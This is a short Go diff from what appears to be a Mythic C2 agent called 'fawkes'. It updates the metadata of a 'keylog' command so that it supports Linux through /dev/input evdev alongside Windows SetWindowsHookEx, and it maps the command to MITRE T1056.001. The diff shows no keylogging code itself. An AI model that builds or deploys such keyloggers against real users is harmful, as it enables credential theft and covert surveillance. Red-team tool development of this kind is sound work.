@@ -17,15 +17,15 @@ var windowSectionRegex = regexp.MustCompile(`\[(\d{2}:\d{2}:\d{2})\] --- (.+?) -
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "keylog",
-		Description:         "Start, stop, or dump a low-level keyboard logger with window context (T1056.001)",
+		Description:         "Start, stop, or dump a low-level keyboard logger. Windows: SetWindowsHookEx. Linux: /dev/input evdev (T1056.001).",
 		HelpString:          "keylog -action <start|stop|dump>",
-		Version:             1,
+		Version:             2,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
 		MitreAttackMappings: []string{"T1056.001"},
 		ScriptOnlyCommand:   false,
 		CommandAttributes: agentstructs.CommandAttribute{
-			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
+			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX},
 		},
 		CommandParameters: []agentstructs.CommandParameter{
 			{
